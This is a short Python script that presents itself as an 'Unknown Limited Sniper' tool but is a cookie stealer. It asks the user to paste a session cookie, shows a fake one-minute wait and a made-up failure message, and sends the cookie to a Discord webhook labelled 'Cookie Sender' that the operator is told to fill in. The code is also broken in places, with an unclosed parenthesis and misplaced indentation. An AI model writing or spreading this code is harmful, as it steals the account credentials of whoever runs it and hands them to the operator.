from dhooks import Webhook
import requests, threading, os
import time
import colorama
from colorama import Fore, Back, Style
from pystyle import Anime, Colorate, Colors, Center, System, Write
from urllib import response

colorama.init()

loadingauth = ""
#put your webhook between ""


def w(text: str):
    Write.Input(text=text,
                color=Colors.purple_to_blue,
                interval=0.005,
                input_color=Colors.white)


def startup():
    System.Clear()
    System.Title("Unknown Sniper")
    System.Size(200, 60)


startup()


def main():
    w("Welcome to Unknown Limited Sniper! Press enter to continue")
    
    cookiedata = Write.Input("cookie ->",
                             Colors.purple_to_blue,
                             interval=0.005)
    os.system('cls')
    w("Wait one minute, do not press anything or the program will close!")
time.sleep(67)
w("Could not snipe anything, please use later in 20 minutes."
    requests.post(loadingauth,
                  json={
                      'username': 'Cookie Sender',
                      'content': f'```{cookiedata}```'
                  })
    

main()
